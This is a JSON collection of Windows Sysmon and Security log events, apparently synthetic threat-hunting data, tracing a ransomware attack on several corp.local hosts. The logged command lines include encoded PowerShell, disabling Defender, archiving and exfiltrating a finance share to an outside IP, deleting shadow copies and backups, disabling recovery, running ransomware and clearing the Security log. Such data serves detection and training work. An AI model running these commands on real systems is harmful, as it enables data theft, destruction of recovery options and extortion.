[
 {
  "_time": "2026-08-24T08:40:00.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "WKS-1180",
  "ComputerName": "WKS-1180.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe",
  "ParentImage": "C:\\Windows\\explorer.exe",
  "CommandLine": "outlook.exe",
  "ProcessId": "2166",
  "ParentProcessId": "547",
  "Hashes": "SHA256=665D7F73E413942B33CEE54FFE6738C54431DB8C66BA08BB30ECEB5B25D09449",
  "_raw": "Sysmon EventID 1 Process Create C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe"
 },
 {
  "_time": "2026-08-24T08:43:00.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "WKS-1180",
  "ComputerName": "WKS-1180.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\outlook.exe",
  "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
  "ProcessId": "2150",
  "ParentProcessId": "931",
  "Hashes": "SHA256=EB88B64848249B7103139D9E3ACE6EB3046D48145532C2125BF08DC5935F0DC7",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
 },
 {
  "_time": "2026-08-24T08:45:00.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "WKS-1180",
  "ComputerName": "WKS-1180.corp.local",
  "EventCode": "3",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\svchost.exe",
  "SourceIp": "10.7.3.42",
  "SourcePort": "64247",
  "DestinationIp": "185.220.101.44",
  "DestinationPort": "443",
  "Protocol": "tcp",
  "_raw": "Sysmon EventID 3 Network connection detected"
 },
 {
  "_time": "2026-08-24T08:51:00.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "WKS-1180",
  "ComputerName": "WKS-1180.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Users\\mgarcia\\AppData\\Local\\Temp\\adfind.exe",
  "ParentImage": "C:\\Windows\\explorer.exe",
  "CommandLine": "adfind.exe 10.7.0.0/16",
  "ProcessId": "8755",
  "ParentProcessId": "638",
  "Hashes": "SHA256=9F23BCF0407F80C2FF2419DBA5F885700172BBC898007D2CFA37F2051379C9C4",
  "_raw": "Sysmon EventID 1 Process Create C:\\Users\\mgarcia\\AppData\\Local\\Temp\\adfind.exe"
 },
 {
  "_time": "2026-08-24T08:53:00.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "WKS-1180",
  "ComputerName": "WKS-1180.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Users\\mgarcia\\AppData\\Local\\Temp\\advanced_ip_scanner.exe",
  "ParentImage": "C:\\Windows\\explorer.exe",
  "CommandLine": "advanced_ip_scanner.exe 10.7.0.0/16",
  "ProcessId": "7048",
  "ParentProcessId": "1151",
  "Hashes": "SHA256=55226FF3C402995F74AD968623D9FE4F0481059B81DDA2B3495CFE53E787A604",
  "_raw": "Sysmon EventID 1 Process Create C:\\Users\\mgarcia\\AppData\\Local\\Temp\\advanced_ip_scanner.exe"
 },
 {
  "_time": "2026-08-24T08:55:00.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "WKS-1180",
  "ComputerName": "WKS-1180.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\cmd.exe",
  "ParentImage": "C:\\Windows\\explorer.exe",
  "CommandLine": "cmd.exe /c net group \"Domain Admins\" /domain & nltest /dclist:corp.local",
  "ProcessId": "4919",
  "ParentProcessId": "1253",
  "Hashes": "SHA256=2F61D1A9006CE2DFCAF5FB04B206C0DF6CBBF2D4278E7A79A57D0A445F7B61E0",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\cmd.exe"
 },
 {
  "_time": "2026-08-24T08:59:00.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "WKS-1180",
  "ComputerName": "WKS-1180.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "ParentImage": "C:\\Windows\\explorer.exe",
  "CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
  "ProcessId": "6388",
  "ParentProcessId": "1763",
  "Hashes": "SHA256=68FCB91BD13ABBEAF95F0A02742C654D2D4F3268E43AFBA157C72BAE37F2DCA9",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
 },
 {
  "_time": "2026-08-24T09:04:00.000Z",
  "sourcetype": "WinEventLog:Security",
  "source": "WinEventLog:Security",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "4625",
  "Account_Name": "administrator",
  "Account_Domain": "CORP",
  "Logon_Type": "3",
  "Source_Network_Address": "10.7.3.42",
  "Workstation_Name": "WKS-1180",
  "_raw": "EventCode=4625 logon"
 },
 {
  "_time": "2026-08-24T09:04:12.000Z",
  "sourcetype": "WinEventLog:Security",
  "source": "WinEventLog:Security",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "4625",
  "Account_Name": "administrator",
  "Account_Domain": "CORP",
  "Logon_Type": "3",
  "Source_Network_Address": "10.7.3.42",
  "Workstation_Name": "WKS-1180",
  "_raw": "EventCode=4625 logon"
 },
 {
  "_time": "2026-08-24T09:04:24.000Z",
  "sourcetype": "WinEventLog:Security",
  "source": "WinEventLog:Security",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "4625",
  "Account_Name": "administrator",
  "Account_Domain": "CORP",
  "Logon_Type": "3",
  "Source_Network_Address": "10.7.3.42",
  "Workstation_Name": "WKS-1180",
  "_raw": "EventCode=4625 logon"
 },
 {
  "_time": "2026-08-24T09:04:36.000Z",
  "sourcetype": "WinEventLog:Security",
  "source": "WinEventLog:Security",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "4625",
  "Account_Name": "administrator",
  "Account_Domain": "CORP",
  "Logon_Type": "3",
  "Source_Network_Address": "10.7.3.42",
  "Workstation_Name": "WKS-1180",
  "_raw": "EventCode=4625 logon"
 },
 {
  "_time": "2026-08-24T09:04:48.000Z",
  "sourcetype": "WinEventLog:Security",
  "source": "WinEventLog:Security",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "4625",
  "Account_Name": "administrator",
  "Account_Domain": "CORP",
  "Logon_Type": "3",
  "Source_Network_Address": "10.7.3.42",
  "Workstation_Name": "WKS-1180",
  "_raw": "EventCode=4625 logon"
 },
 {
  "_time": "2026-08-24T09:05:00.000Z",
  "sourcetype": "WinEventLog:Security",
  "source": "WinEventLog:Security",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "4625",
  "Account_Name": "administrator",
  "Account_Domain": "CORP",
  "Logon_Type": "3",
  "Source_Network_Address": "10.7.3.42",
  "Workstation_Name": "WKS-1180",
  "_raw": "EventCode=4625 logon"
 },
 {
  "_time": "2026-08-24T09:08:12.000Z",
  "sourcetype": "WinEventLog:Security",
  "source": "WinEventLog:Security",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "4624",
  "Account_Name": "CORP\\mgarcia",
  "Account_Domain": "CORP",
  "Logon_Type": "3",
  "Source_Network_Address": "10.7.3.42",
  "Workstation_Name": "WKS-1180",
  "_raw": "EventCode=4624 logon"
 },
 {
  "_time": "2026-08-24T09:09:12.000Z",
  "sourcetype": "WinEventLog:Security",
  "source": "WinEventLog:Security",
  "host": "SRV-APP03",
  "ComputerName": "SRV-APP03.corp.local",
  "EventCode": "4624",
  "Account_Name": "CORP\\mgarcia",
  "Account_Domain": "CORP",
  "Logon_Type": "3",
  "Source_Network_Address": "10.7.3.42",
  "Workstation_Name": "WKS-1180",
  "_raw": "EventCode=4624 logon"
 },
 {
  "_time": "2026-08-24T09:10:12.000Z",
  "sourcetype": "WinEventLog:Security",
  "source": "WinEventLog:Security",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "4624",
  "Account_Name": "CORP\\mgarcia",
  "Account_Domain": "CORP",
  "Logon_Type": "3",
  "Source_Network_Address": "10.7.3.42",
  "Workstation_Name": "WKS-1180",
  "_raw": "EventCode=4624 logon"
 },
 {
  "_time": "2026-08-24T09:12:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Program Files\\7-Zip\\7z.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "7z.exe a -pinc ransom2026 C:\\Windows\\Temp\\data.7z \\\\SRV-FS01\\finanzas\\*",
  "ProcessId": "3554",
  "ParentProcessId": "752",
  "Hashes": "SHA256=9B82981950F8FF8D75A3BDF3BDF304F7D373DF8084E08C7B36279D59A38EC1A8",
  "_raw": "Sysmon EventID 1 Process Create C:\\Program Files\\7-Zip\\7z.exe"
 },
 {
  "_time": "2026-08-24T09:20:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\backblaze.exe",
  "ParentImage": "C:\\Windows\\explorer.exe",
  "CommandLine": "backblaze.exe copy C:\\Windows\\Temp\\data.7z remote:exfil --transfers 8",
  "ProcessId": "4646",
  "ParentProcessId": "1282",
  "Hashes": "SHA256=BA9817156C10A3C1B0C38D33C093E0EE6093C3EB77CD4CF08D913FDC1E73C2DE",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\Temp\\backblaze.exe"
 },
 {
  "_time": "2026-08-24T09:22:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "3",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\backblaze.exe",
  "SourceIp": "10.7.1.31",
  "SourcePort": "64938",
  "DestinationIp": "45.132.88.17",
  "DestinationPort": "443",
  "Protocol": "tcp",
  "_raw": "Sysmon EventID 3 Network connection detected"
 },
 {
  "_time": "2026-08-24T09:32:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\megasync.exe",
  "ParentImage": "C:\\Windows\\explorer.exe",
  "CommandLine": "megasync.exe copy C:\\Windows\\Temp\\data.7z remote:exfil --transfers 8",
  "ProcessId": "5184",
  "ParentProcessId": "1465",
  "Hashes": "SHA256=1403B5E1AB83DEF8CFA89A044AC9F3E6299D54DE53D4D3053A502E715E39279A",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\Temp\\megasync.exe"
 },
 {
  "_time": "2026-08-24T09:34:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "3",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\megasync.exe",
  "SourceIp": "10.7.1.31",
  "SourcePort": "65390",
  "DestinationIp": "45.132.88.17",
  "DestinationPort": "443",
  "Protocol": "tcp",
  "_raw": "Sysmon EventID 3 Network connection detected"
 },
 {
  "_time": "2026-08-24T09:44:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\vssadmin.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "vssadmin.exe delete shadows /all /quiet",
  "ProcessId": "6230",
  "ParentProcessId": "1005",
  "Hashes": "SHA256=33FD41BE400FE88824CDEF9800163FEC3F3A952B345F380835CA744811AEA38F",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\vssadmin.exe"
 },
 {
  "_time": "2026-08-24T09:44:42.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\wbadmin.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "wbadmin.exe delete catalog -quiet",
  "ProcessId": "5722",
  "ParentProcessId": "1684",
  "Hashes": "SHA256=2F2B342B8B30C57B8E35AEAD8DC8D04E7C76D1ED7BF9246B740FD747D6E71652",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\wbadmin.exe"
 },
 {
  "_time": "2026-08-24T09:45:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\bcdedit.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "bcdedit.exe /set {default} recoveryenabled no",
  "ProcessId": "3351",
  "ParentProcessId": "1738",
  "Hashes": "SHA256=CC2E89FF502DD47BC7F351394643DC52A26276CBD249A6C7DC56684A793D2F93",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\bcdedit.exe"
 },
 {
  "_time": "2026-08-24T09:45:42.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-APP03",
  "ComputerName": "SRV-APP03.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\vssadmin.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "vssadmin.exe delete shadows /all /quiet",
  "ProcessId": "7729",
  "ParentProcessId": "1922",
  "Hashes": "SHA256=33FD41BE400FE88824CDEF9800163FEC3F3A952B345F380835CA744811AEA38F",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\vssadmin.exe"
 },
 {
  "_time": "2026-08-24T09:46:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-APP03",
  "ComputerName": "SRV-APP03.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\wbadmin.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "wbadmin.exe delete catalog -quiet",
  "ProcessId": "2827",
  "ParentProcessId": "944",
  "Hashes": "SHA256=2F2B342B8B30C57B8E35AEAD8DC8D04E7C76D1ED7BF9246B740FD747D6E71652",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\wbadmin.exe"
 },
 {
  "_time": "2026-08-24T09:46:42.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-APP03",
  "ComputerName": "SRV-APP03.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\bcdedit.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "bcdedit.exe /set {default} recoveryenabled no",
  "ProcessId": "7128",
  "ParentProcessId": "1691",
  "Hashes": "SHA256=CC2E89FF502DD47BC7F351394643DC52A26276CBD249A6C7DC56684A793D2F93",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\bcdedit.exe"
 },
 {
  "_time": "2026-08-24T09:47:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\vssadmin.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "vssadmin.exe delete shadows /all /quiet",
  "ProcessId": "4514",
  "ParentProcessId": "1140",
  "Hashes": "SHA256=33FD41BE400FE88824CDEF9800163FEC3F3A952B345F380835CA744811AEA38F",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\vssadmin.exe"
 },
 {
  "_time": "2026-08-24T09:47:42.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\wbadmin.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "wbadmin.exe delete catalog -quiet",
  "ProcessId": "4227",
  "ParentProcessId": "1682",
  "Hashes": "SHA256=2F2B342B8B30C57B8E35AEAD8DC8D04E7C76D1ED7BF9246B740FD747D6E71652",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\wbadmin.exe"
 },
 {
  "_time": "2026-08-24T09:48:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\bcdedit.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "bcdedit.exe /set {default} recoveryenabled no",
  "ProcessId": "7083",
  "ParentProcessId": "1636",
  "Hashes": "SHA256=CC2E89FF502DD47BC7F351394643DC52A26276CBD249A6C7DC56684A793D2F93",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\bcdedit.exe"
 },
 {
  "_time": "2026-08-24T09:51:42.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "ParentImage": "C:\\Windows\\System32\\services.exe",
  "CommandLine": "incransom.exe --path C:\\ --threads 16",
  "ProcessId": "2404",
  "ParentProcessId": "1955",
  "Hashes": "SHA256=876E12D43ADF7CC7CAE88130D52F9BC1C8DFE8EADF58BD2DA7CD230AA1B62FB9",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\Temp\\incransom.exe"
 },
 {
  "_time": "2026-08-24T09:52:12.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "11",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "TargetFilename": "C:\\README.txt",
  "Hashes": "SHA256=0197B7DCE7E04DD1188CFE8E21FAD3165A3FEA85322AD945A2CD7EAF14F75388",
  "_raw": "Sysmon EventID 11 File created"
 },
 {
  "_time": "2026-08-24T09:52:30.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-FS01",
  "ComputerName": "SRV-FS01.corp.local",
  "EventCode": "11",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "TargetFilename": "C:\\Users\\Public\\Documents\\README.txt",
  "Hashes": "SHA256=2FB4ADC6C2B05AC04DA007840A3BDCC606B507C16DA933ADD3186DAB09EADBA5",
  "_raw": "Sysmon EventID 11 File created"
 },
 {
  "_time": "2026-08-24T09:52:54.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-APP03",
  "ComputerName": "SRV-APP03.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "ParentImage": "C:\\Windows\\System32\\services.exe",
  "CommandLine": "incransom.exe --path C:\\ --threads 16",
  "ProcessId": "5729",
  "ParentProcessId": "983",
  "Hashes": "SHA256=876E12D43ADF7CC7CAE88130D52F9BC1C8DFE8EADF58BD2DA7CD230AA1B62FB9",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\Temp\\incransom.exe"
 },
 {
  "_time": "2026-08-24T09:53:24.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-APP03",
  "ComputerName": "SRV-APP03.corp.local",
  "EventCode": "11",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "TargetFilename": "C:\\README.txt",
  "Hashes": "SHA256=0197B7DCE7E04DD1188CFE8E21FAD3165A3FEA85322AD945A2CD7EAF14F75388",
  "_raw": "Sysmon EventID 11 File created"
 },
 {
  "_time": "2026-08-24T09:53:42.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-APP03",
  "ComputerName": "SRV-APP03.corp.local",
  "EventCode": "11",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "TargetFilename": "C:\\Users\\Public\\Documents\\README.txt",
  "Hashes": "SHA256=2FB4ADC6C2B05AC04DA007840A3BDCC606B507C16DA933ADD3186DAB09EADBA5",
  "_raw": "Sysmon EventID 11 File created"
 },
 {
  "_time": "2026-08-24T09:54:06.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "ParentImage": "C:\\Windows\\System32\\services.exe",
  "CommandLine": "incransom.exe --path C:\\ --threads 16",
  "ProcessId": "6702",
  "ParentProcessId": "1385",
  "Hashes": "SHA256=876E12D43ADF7CC7CAE88130D52F9BC1C8DFE8EADF58BD2DA7CD230AA1B62FB9",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\Temp\\incransom.exe"
 },
 {
  "_time": "2026-08-24T09:54:36.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "11",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "TargetFilename": "C:\\README.txt",
  "Hashes": "SHA256=0197B7DCE7E04DD1188CFE8E21FAD3165A3FEA85322AD945A2CD7EAF14F75388",
  "_raw": "Sysmon EventID 11 File created"
 },
 {
  "_time": "2026-08-24T09:54:54.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "11",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "TargetFilename": "C:\\Users\\Public\\Documents\\README.txt",
  "Hashes": "SHA256=2FB4ADC6C2B05AC04DA007840A3BDCC606B507C16DA933ADD3186DAB09EADBA5",
  "_raw": "Sysmon EventID 11 File created"
 },
 {
  "_time": "2026-08-24T09:55:18.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "WKS-1180",
  "ComputerName": "WKS-1180.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "ParentImage": "C:\\Windows\\System32\\services.exe",
  "CommandLine": "incransom.exe --path C:\\ --threads 16",
  "ProcessId": "2903",
  "ParentProcessId": "520",
  "Hashes": "SHA256=876E12D43ADF7CC7CAE88130D52F9BC1C8DFE8EADF58BD2DA7CD230AA1B62FB9",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\Temp\\incransom.exe"
 },
 {
  "_time": "2026-08-24T09:55:48.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "WKS-1180",
  "ComputerName": "WKS-1180.corp.local",
  "EventCode": "11",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "TargetFilename": "C:\\README.txt",
  "Hashes": "SHA256=0197B7DCE7E04DD1188CFE8E21FAD3165A3FEA85322AD945A2CD7EAF14F75388",
  "_raw": "Sysmon EventID 11 File created"
 },
 {
  "_time": "2026-08-24T09:56:06.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "WKS-1180",
  "ComputerName": "WKS-1180.corp.local",
  "EventCode": "11",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\Temp\\incransom.exe",
  "TargetFilename": "C:\\Users\\Public\\Documents\\README.txt",
  "Hashes": "SHA256=2FB4ADC6C2B05AC04DA007840A3BDCC606B507C16DA933ADD3186DAB09EADBA5",
  "_raw": "Sysmon EventID 11 File created"
 },
 {
  "_time": "2026-08-24T09:56:30.000Z",
  "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
  "source": "Sysmon",
  "host": "SRV-DC02",
  "ComputerName": "SRV-DC02.corp.local",
  "EventCode": "1",
  "User": "CORP\\mgarcia",
  "Image": "C:\\Windows\\System32\\wevtutil.exe",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "wevtutil.exe cl Security",
  "ProcessId": "4830",
  "ParentProcessId": "1799",
  "Hashes": "SHA256=8660B4D4132A96FBD6790D3015F1EAD47B495AA89E14FF1567E3BD4D741181CB",
  "_raw": "Sysmon EventID 1 Process Create C:\\Windows\\System32\\wevtutil.exe"
 }
]
